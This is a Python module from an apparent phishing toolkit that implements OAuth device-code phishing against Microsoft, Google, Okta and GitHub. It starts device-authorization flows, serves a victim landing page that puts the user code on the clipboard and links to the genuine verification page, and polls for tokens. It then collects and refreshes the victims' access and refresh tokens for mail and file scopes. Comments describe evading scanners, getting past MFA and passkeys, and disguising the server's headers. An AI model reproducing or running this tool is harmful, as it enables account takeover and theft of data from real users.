"""Device-authorization-code relay (RFC 8628).

The reverse proxy in `core/proxy.py` needs the victim to be looking at a page we
serve, on a domain we control. The device-authorization grant needs none of that: the
attacker starts the flow with the identity provider, receives a short `user_code`, and
sends the victim to the provider's **real** verification page with that code. When the
victim approves, the provider hands the attacker's client the tokens over its own
`/token` endpoint. There is no lookalike domain to classify, no proxy TLS to
fingerprint, and MFA is satisfied by the victim on the genuine site; a passkey works
too, because the ceremony happens where it is supposed to.

Two honest limits, stated up front because they decide whether it works at all:

* the tenant must allow the device-code grant for the client id you use. Microsoft
  365 tenants increasingly block it, or require a compliant device via conditional
  access, and a blocked flow fails at `/devicecode` with `unauthorized_client` or
  `invalid_grant` - there is no workaround from here.
* the tokens are scoped to that client's permissions, not to a browser session.

`client_id` is deliberately **required input**: first-party CLI client ids differ per
tenant policy and change without notice, and shipping a guessed one would be a silent
failure. Register your own application (public client, device-code flow enabled) and
pass `--dc-client-id`. Standard library only, like the rest of the tool.
"""
import html
import json
import logging
import secrets
import threading
import time
import urllib.error
import urllib.parse
import urllib.request

from . import net

__all__ = ["PROVIDERS", "DeviceCodeError", "DeviceCodeFlow",
           "DeviceCodeManager", "serve"]

log = logging.getLogger("bytephisher.devicecode")

# Issuer templates and the scope each provider's own tooling asks for. `{tenant}`
# is substituted from `tenant` (Microsoft accepts `common`, `organizations`, or a
# tenant id; Google and GitHub have no tenant).
# Endpoint paths differ per vendor, and guessing them is a silent failure: a live
# probe (2026-10-08) answered `unauthorized_client`/`invalid_grant` (a real OAuth
# error) at Microsoft's `/devicecode` and `/token` and at Google's `/device/code`
# and `/token`, while `/devicecode` (Google) and `/oauth2/token` answered 404 - the
# wrong path looks like a broken provider rather than a bug. GitHub's endpoints are
# documented but were NOT verifiable with an unregistered client id (it answered 404
# `Not Found`), so treat that entry as documented-only until you use a real app.
PROVIDERS = {
    "microsoft": {
        "issuer": "https://login.microsoftonline.com/{tenant}/oauth2/v2.0",
        "tenant": "common",
        "device_path": "/devicecode",
        "token_path": "/token",
        "scope": "offline_access openid profile https://graph.microsoft.com/.default",
        "verification_uri": "https://microsoft.com/devicelogin",
    },
    "microsoft-graph": {
        "issuer": "https://login.microsoftonline.com/{tenant}/oauth2/v2.0",
        "tenant": "common",
        "scope": "offline_access openid profile https://graph.microsoft.com/Mail.Read "
                 "https://graph.microsoft.com/Files.ReadWrite "
                 "https://graph.microsoft.com/User.Read",
        "verification_uri": "https://microsoft.com/devicelogin",
        "device_path": "/devicecode",
        "token_path": "/token",
    },
    "google": {
        "issuer": "https://oauth2.googleapis.com",
        "scope": "openid email profile https://www.googleapis.com/auth/gmail.readonly",
        "verification_uri": "https://www.google.com/device",
        "device_path": "/device/code",       # /devicecode answers 404 (probed)
        "token_path": "/token",
    },
    "okta": {
        "issuer": "https://{tenant}/oauth2/default",
        "tenant": "",
        "scope": "openid offline_access profile",
        "verification_uri": "",          # taken from the device-authorization answer
        "device_path": "/v1/device",
        "token_path": "/v1/token",
    },
    "github": {
        "issuer": "https://github.com",
        "scope": "repo read:user",
        "verification_uri": "https://github.com/login/device",
        "device_path": "/login/device/code",
        "token_path": "/login/oauth/access_token",
    },
    # `custom` lets an operator point at any RFC 8628 implementation (a lab IdP, a
    # self-hosted Keycloak/Authentik, or a different vendor).
    "custom": {"issuer": "{tenant}", "tenant": "", "scope": "",
               "verification_uri": "", "device_path": "/devicecode",
               "token_path": "/token"},
}

DEVICE_GRANT = "urn:ietf:params:oauth:grant-type:device_code"


class DeviceCodeError(RuntimeError):
    """The provider refused the flow (or the flow expired)."""


def _post_form(url, payload, timeout=15):
    """POST an `application/x-www-form-urlencoded` body and decode the JSON answer.

    RFC 8628 mandates form encoding for both endpoints; `net.post_json` sends JSON and
    would be answered with `invalid_request`.
    """
    body = urllib.parse.urlencode(payload).encode()
    req = urllib.request.Request(url, data=body, headers={
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept": "application/json",
        "User-Agent": net._DEFAULT_UA,
    })
    try:
        with net.urlopen(req, timeout=timeout) as r:
            raw = r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        # RFC 8628 answers `authorization_pending` / `slow_down` / `expired_token`
        # with HTTP 400 and a JSON body, so a 4xx here is a normal answer, not a
        # transport failure: read the body and let the caller read `error`.
        raw = e.read().decode("utf-8", "replace")
    except (urllib.error.URLError, TimeoutError, OSError) as e:
        # an unreachable or hanging provider used to escape as URLError/TimeoutError and
        # reach the CLI as a raw traceback ("the tool is broken"); it is a refusal
        raise DeviceCodeError(
            f"{url} is unreachable ({type(e).__name__}: "
            f"{getattr(e, 'reason', e)}) - check the issuer/tenant and the network"
        ) from e
    try:
        return json.loads(raw)
    except ValueError as e:
        raise DeviceCodeError(f"non-JSON answer from {url}: {raw[:200]}") from e


class DeviceCodeFlow:
    """One device-authorization flow: start it, show the code, poll for tokens."""

    def __init__(self, provider, client_id, tenant=None, scope=None, tag="",
                 issuer=None, verification_uri=None, timeout=15):
        if provider not in PROVIDERS:
            raise DeviceCodeError(f"unknown provider {provider!r}; "
                                  f"known: {', '.join(sorted(PROVIDERS))}")
        if not client_id:
            raise DeviceCodeError(
                "client_id is required: register an application with the device-code "
                "flow enabled and pass --dc-client-id (a guessed id fails silently)")
        conf = PROVIDERS[provider]
        self.provider = provider
        self.client_id = client_id
        self.tenant = tenant if tenant is not None else conf.get("tenant", "")
        self.issuer = (issuer or conf["issuer"]).format(tenant=self.tenant).rstrip("/")
        if not self.issuer or "://" not in self.issuer:
            # an empty issuer surfaced as `ValueError: unknown url type:
            # '/devicecode'` from deep inside urllib, i.e. a traceback instead of a
            # refusal that tells the operator what to pass
            raise DeviceCodeError(
                f"provider {provider!r} needs an issuer URL"
                + (" (for `custom`, pass --dc-tenant with the base URL)"
                   if provider == "custom" else ""))
        self.scope = scope if scope is not None else conf.get("scope", "")
        self.device_path = conf.get("device_path", "/devicecode")
        self.token_path = conf.get("token_path", "/token")
        # a second-resolution tag collides when several flows start together, and
        # a colliding tag overwrites the entry it should have been listed beside
        self.tag = tag or f"dc{int(time.time())}-{secrets.token_hex(3)}"
        self.timeout = timeout
        # filled in by start()
        self.device_code = ""
        self.user_code = ""
        self.verification_uri = verification_uri or conf.get("verification_uri", "")
        self.verification_uri_complete = ""
        self.interval = 5
        self.expires_at = 0.0
        self.started_at = 0.0
        self.status = "new"          # new|pending|token|expired|denied|error
        self.error = ""
        self.tokens = {}
        self.poll_count = 0

    # ---------------------------------------------------------------- start ==
    def start(self):
        """Ask the provider for a user_code. Raises DeviceCodeError on refusal."""
        data = {"client_id": self.client_id}
        if self.scope:
            data["scope"] = self.scope
        answer = _post_form(f"{self.issuer}{self.device_path}", data,
                           timeout=self.timeout)
        if "user_code" not in answer:
            # `error`/`error_description` is what a tenant that blocks the grant says
            raise DeviceCodeError(
                f"{self.provider} refused the device-code grant: "
                f"{answer.get('error', 'no user_code')} "
                f"{answer.get('error_description', '')}".strip())
        self.device_code = answer["device_code"]
        self.user_code = answer["user_code"]
        self.verification_uri = answer.get("verification_uri") or self.verification_uri
        self.verification_uri_complete = answer.get("verification_uri_complete", "")
        self.interval = int(answer.get("interval") or 5)
        expires_in = int(answer.get("expires_in") or 900)
        self.started_at = time.time()
        self.expires_at = self.started_at + expires_in
        self.status = "pending"
        log.info("device code %s for %s: %s at %s", self.tag, self.provider,
                 self.user_code, self.verification_uri)
        return self

    # ----------------------------------------------------------------- poll ==
    def poll_once(self):
        """One `/token` attempt. Returns the status string."""
        if self.status in ("token", "expired", "denied", "error"):
            return self.status
        if not self.device_code:
            raise DeviceCodeError("start() must be called before poll_once()")
        if time.time() >= self.expires_at:
            self.status = "expired"
            return self.status
        self.poll_count += 1
        answer = _post_form(f"{self.issuer}{self.token_path}", {
            "grant_type": DEVICE_GRANT,
            "device_code": self.device_code,
            "client_id": self.client_id,
        }, timeout=self.timeout)
        if answer.get("access_token"):
            self.tokens = answer
            self.status = "token"
            log.info("device code %s: tokens received (%s)", self.tag,
                     ", ".join(sorted(k for k in answer if "token" in k)))
            return self.status
        err = answer.get("error", "")
        if err == "authorization_pending":
            self.status = "pending"
        elif err == "slow_down":
            # RFC 8628: add 5s to the interval and keep waiting
            self.interval += 5
            self.status = "pending"
        elif err == "expired_token":
            self.status = "expired"
        elif err in ("access_denied", "authorization_declined"):
            self.status = "denied"
        else:
            self.status = "error"
        self.error = err or self.error
        return self.status

    def poll(self, max_wait=None, sleep=time.sleep):
        """Poll until a token arrives, the flow expires, or `max_wait` elapses.

        `sleep` is injectable so a test does not spend real time on the interval.
        """
        deadline = time.time() + (max_wait if max_wait is not None else
                                  max(0.0, self.expires_at - time.time()))
        while time.time() < deadline:
            try:
                st = self.poll_once()
            except DeviceCodeError as e:
                # one provider blip aborted the whole poll 1 s into an 8 s
                # window. A transport failure is not a verdict - keep trying until the
                # deadline and report what the last attempt said.
                self.error = str(e)
                st = "pending"
            if st != "pending":
                return st
            sleep(self.interval)
        return self.status

    # --------------------------------------------------------------- tokens ==
    def refresh(self, refresh_token=None):
        """Exchange a refresh token for a new access token."""
        rt = refresh_token or self.tokens.get("refresh_token")
        if not rt:
            raise DeviceCodeError("no refresh token")
        answer = _post_form(f"{self.issuer}{self.token_path}", {
            "grant_type": "refresh_token",
            "refresh_token": rt,
            "client_id": self.client_id,
        }, timeout=self.timeout)
        if not answer.get("access_token"):
            raise DeviceCodeError(f"refresh refused: {answer.get('error', 'unknown')}")
        if not answer.get("refresh_token"):
            answer["refresh_token"] = rt           # providers may rotate silently
        # merge: a refresh answer often omits scope/id_token/token_type, and replacing
        # the set wholesale made the flow's own view lose them
        merged = dict(self.tokens or {})
        merged.update(answer)
        self.tokens = merged
        self.status = "token"
        return self.tokens

    # ------------------------------------------------------------- helpers ==
    @property
    def expires_in(self):
        return max(0, int(self.expires_at - time.time())) if self.expires_at else 0

    def to_dict(self, with_tokens=True):
        d = {
            "tag": self.tag, "provider": self.provider, "client_id": self.client_id,
            "tenant": self.tenant, "issuer": self.issuer, "scope": self.scope,
            "user_code": self.user_code, "verification_uri": self.verification_uri,
            "verification_uri_complete": self.verification_uri_complete,
            "device_endpoint": f"{self.issuer}{self.device_path}",
            "interval": self.interval, "status": self.status, "error": self.error,
            "expires_in": self.expires_in, "polls": self.poll_count,
            "started_at": self.started_at,
        }
        if with_tokens and self.tokens:
            d["tokens"] = {k: v for k, v in self.tokens.items()
                           if k in ("access_token", "refresh_token", "id_token",
                                    "token_type", "scope", "expires_in")}
        return d

    def instructions(self):
        """What the victim is told, in the order they need it."""
        uri = self.verification_uri_complete or self.verification_uri
        return (f"1. Open {uri}\n"
                f"2. Enter this code: {self.user_code}\n"
                f"3. Approve the sign-in request\n")


class DeviceCodeManager:
    """Keeps the live flows and renders the page the victim lands on."""

    def __init__(self, base_url="", logger=None, max_flows=64):
        self.lock = threading.RLock()
        self.flows = {}
        self.order = []
        self.base_url = base_url
        self.logger = logger or log
        self.max_flows = max_flows
        self.captured = []            # one entry per flow that reached "token"

    # ------------------------------------------------------------------ api ==
    def start(self, provider, client_id, **kwargs):
        flow = DeviceCodeFlow(provider, client_id, **kwargs).start()
        with self.lock:
            self.flows[flow.tag] = flow
            if flow.tag not in self.order:
                self.order.append(flow.tag)   # a duplicate evicted the live flow below
            else:
                self.order.remove(flow.tag)
                self.order.append(flow.tag)
            while len(self.order) > self.max_flows:
                self.flows.pop(self.order.pop(0), None)
        return flow

    def get(self, tag):
        with self.lock:
            return self.flows.get(tag)

    def poll_all(self, on_token=None):
        """One poll attempt for every pending flow; reports the ones that completed."""
        done = []
        with self.lock:
            flows = list(self.flows.values())
        for f in flows:
            if f.status != "pending":
                continue
            try:
                f.poll_once()
            except Exception as e:                    # a dead provider must not stop
                f.error = str(e)                       # the other live flows
                self.logger.warning("device code %s poll failed: %s", f.tag, e)
                continue
            if f.status == "token":
                rec = {"tag": f.tag, "provider": f.provider, "user_code": f.user_code,
                       "tokens": f.to_dict()["tokens"]}
                self.captured.append(rec)
                done.append(rec)
                if on_token:
                    on_token(rec)
        return done

    def stats(self):
        with self.lock:
            return {
                "flows": len(self.flows),
                "pending": sum(1 for f in self.flows.values() if f.status == "pending"),
                "tokens": sum(1 for f in self.flows.values() if f.status == "token"),
            }

    def summary(self):
        with self.lock:
            return [self.flows[t].to_dict(with_tokens=False)
                    for t in self.order if t in self.flows]

    # -------------------------------------------------------------- landing ==
    def landing_html(self, tag, link_prefix="", brand="Account"):
        """The page the victim sees: the code, a copy button, the provider's real URL.

        Nothing here imitates the provider: the button opens the genuine
        `verification_uri`, which is the whole point of the technique (there is no
        lookalike domain for a scanner or the victim to notice).
        """
        f = self.get(tag)
        if f is None:
            return "<!doctype html><title>expired</title><h1>Code expired</h1>"
        uri = f.verification_uri_complete or f.verification_uri
        code = f.user_code
        # the code and the URL come from the provider and the tag from the flow: none of
        # them may break out of the HTML or the inline fetch() below
        safe_uri = html.escape(str(uri), quote=True)
        safe_code = html.escape(str(code), quote=True)
        status_url = json.dumps(str((link_prefix or "") + "/__bh/dc/" + str(tag)
                                    + "/status")).replace("<", "\\u003c").replace(
            ">", "\\u003e").replace("&", "\\u0026")
        return f"""<!doctype html>
<html lang="en"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>{brand} device sign-in</title>
<style>
 body{{font:16px/1.5 system-ui,Segoe UI,Roboto,sans-serif;margin:0;
      background:#f6f7f9;color:#1b1b1f;display:flex;min-height:100vh;
      align-items:center;justify-content:center}}
 .card{{background:#fff;border:1px solid #e3e5ea;border-radius:12px;
        padding:28px 30px;max-width:420px;width:100%;box-shadow:0 1px 3px rgba(0,0,0,.06)}}
 h1{{font-size:19px;margin:0 0 14px}}
 .code{{font:600 30px/1.1 ui-monospace,Menlo,Consolas,monospace;letter-spacing:3px;
        background:#f2f4f8;border:1px dashed #c9cdd6;border-radius:10px;
        padding:14px;text-align:center;margin:8px 0 18px;user-select:all}}
 .row{{display:flex;gap:10px}}
 a.btn,button{{flex:1;text-align:center;padding:11px 14px;border-radius:8px;
        border:0;font:inherit;cursor:pointer;text-decoration:none}}
 a.btn{{background:#0b5cad;color:#fff}}
 button{{background:#e9ecf1;color:#1b1b1f}}
 ol{{padding-left:20px;margin:0 0 16px}} li{{margin:4px 0}}
 .muted{{color:#5c626e;font-size:13px}}
</style></head><body>
<div class="card">
  <h1>{brand} device sign-in</h1>
  <p class="muted">Enter the code below on the page that opens.</p>
  <div class="code" id="c">{safe_code}</div>
  <ol><li>The verification page opens in a new tab.</li>
      <li>Paste the code (it is already on your clipboard if your browser allows).</li>
      <li>Approve the request and come back here.</li></ol>
  <div class="row">
    <a class="btn" href="{safe_uri}" target="_blank" rel="noopener"
       onclick="try{{navigator.clipboard.writeText('{safe_code}')}}catch(e){{}}">Open {brand}</a>
    <button onclick="try{{navigator.clipboard.writeText('{safe_code}');this.textContent='Copied'}}catch(e){{this.textContent='Copy failed'}}">Copy code</button>
  </div>
  <p class="muted" id="s">Waiting for approval...</p>
</div>
<script>
(function(){{
  var t = setInterval(function(){{
    fetch({status_url},
          {{cache:"no-store"}})
      .then(function(r){{return r.json()}})
      .then(function(d){{
        var s = document.getElementById("s");
        if (d.status === "token") {{ s.textContent = "Approved. You can close this tab."; clearInterval(t); }}
        else if (d.status === "expired") {{ s.textContent = "Code expired."; clearInterval(t); }}
        else {{ s.textContent = "Waiting for approval... (" + d.expires_in + "s left)"; }}
      }}).catch(function(){{}});
  }}, 4000);
}})();
</script></body></html>
"""


# ============================================================ serving it ======
def serve(manager, port, link_prefix="", brand="Account", on_token=None,
          poll=True, poll_interval=5, server_header="nginx", logger=None):
    """Serve the landing page and the status route for a `DeviceCodeManager`.

    `/dc/<tag>`           the page the victim opens (code + the REAL provider URL)
    `/__bh/dc/<tag>/status`  JSON the page polls: {status, expires_in}

    Header hygiene matches the rest of the tool: our own `Server` value, never
    Python's, and exactly one Date per response. When `poll` is set a background
    thread polls every pending flow and calls `on_token(record)` on completion.
    Returns (httpd, thread_or_None).
    """
    import threading as _threading
    from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

    log_ = logger or log
    header = (server_header or "").strip()

    class H(BaseHTTPRequestHandler):
        server_header = header
        server_version = "nginx"
        sys_version = ""
        protocol_version = "HTTP/1.1"           # the landing's status polls reuse it

        def log_message(self, *a):                    # keep the console clean
            pass

        def version_string(self):
            return self.server_header or ""

        def send_response(self, code, message=None):
            # exactly one Server and one Date, and never "BaseHTTP/0.6 Python/3.x"
            self.log_request(code)
            self.send_response_only(code, message)
            if self.server_header:
                self.send_header("Server", self.server_header)
            self.send_header("Date", self.date_time_string())

        def _body(self, payload, ctype="text/html; charset=utf-8", status=200):
            raw = payload.encode() if isinstance(payload, str) else payload
            self.send_response(status)
            self.send_header("Content-Type", ctype)
            self.send_header("Content-Length", str(len(raw)))
            self.send_header("Cache-Control", "no-store")
            self.end_headers()
            self.wfile.write(raw)

        def do_GET(self):
            path = urllib.parse.urlsplit(self.path).path
            if path.startswith("/__bh/dc/") and path.endswith("/status"):
                tag = path[len("/__bh/dc/"):-len("/status")]
                f = manager.get(tag)
                if f is None:
                    self._body(json.dumps({"status": "expired", "expires_in": 0}),
                               "application/json")
                    return
                self._body(json.dumps({"status": f.status,
                                       "expires_in": f.expires_in}),
                           "application/json")
                return
            if path.startswith("/dc/"):
                tag = path[len("/dc/"):].split("/")[0]
                self._body(manager.landing_html(tag, link_prefix=link_prefix,
                                                brand=brand))
                return
            self._body("not found", "text/plain", status=404)

    httpd = ThreadingHTTPServer(("0.0.0.0", port), H)
    t = _threading.Thread(target=httpd.serve_forever, daemon=True)
    t.start()

    poller = None
    if poll:
        def _loop():
            while True:
                try:
                    manager.poll_all(on_token=on_token)
                except Exception as e:               # never let the loop die
                    log_.warning("device-code poll loop: %s", e)
                time.sleep(max(1, poll_interval))

        poller = _threading.Thread(target=_loop, daemon=True)
        poller.start()
    log_.info("device-code landing on :%d (prefix %r)", port, link_prefix)
    return httpd, poller
